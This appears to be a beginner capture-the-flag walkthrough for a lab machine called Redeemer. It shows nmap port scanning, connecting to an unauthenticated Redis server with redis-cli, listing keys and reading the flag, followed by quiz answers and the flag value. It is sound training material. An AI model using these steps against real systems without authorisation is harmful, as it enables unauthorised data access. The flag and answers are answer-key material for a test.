## Redeemer

Somehow nmap wouldn't show me any results, even tough I used the exact same command as the write up: `nmap -p- -sV 10.129.25.57` 

So I decided to use the `-help` option to find what the `-p` option does. This option lets you select what ports to scan, so I just simply let it scan all ports with `nmap -p1-65535 -sV 10.129.25.57` 

```
PORT     	STATE 	SERVICE 	VERSION
6379/tcp 	open  	redis   	Redis key-value store 5.0.7
```

Continue on with the next step, using the `-h` option to connect to the host: `redis-cli -h 10.129.25.57`   

Used the `info` command to get the redis_version and Database information:

```
10.129.25.57:6379> info
# Server
redis_version:5.0.7

~snip~

# Keyspace
db0:keys=4,expires=0,avg_ttl=0

```

Selected Database 0 with: `10.129.25.57:6379> select 0`

Continued by requesting all keys in the database: `10.129.25.57:6379> keys *`

```
1) "flag"
2) "temp"
3) "numb"
4) "stor"
```

Found the flag and opened it with: `10.129.25.57:6379> get flag` 

```
"03e1d2b376c37ab3f5319922053953eb"
```

## Screenshots

![pwnd Redeemer.png](..%2Fmedia%2Fpwnd%20Redeemer.png)

## Quiz Questions

Which TCP port is open on the machine? 
- 6379

Which service is running on the port that is open on the machine?
- Redis 

What type of database is Redis?
- In-memory Database

Which command-line utility is used to interact with the Redis server?
- Redis CLI

Which flag is used with the Redis command-line utility to specify the hostname? 
- -h

Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
- info

What is the version of the Redis server being used on the target machine?
- 5.0.7

Which command is used to select the desired database in Redis?
- select

How many keys are present inside the database with index 0?
- 4

Which command is used to obtain all the keys in a database? 
- keys *

Root flag
- 03e1d2b376c37ab3f5319922053953eb
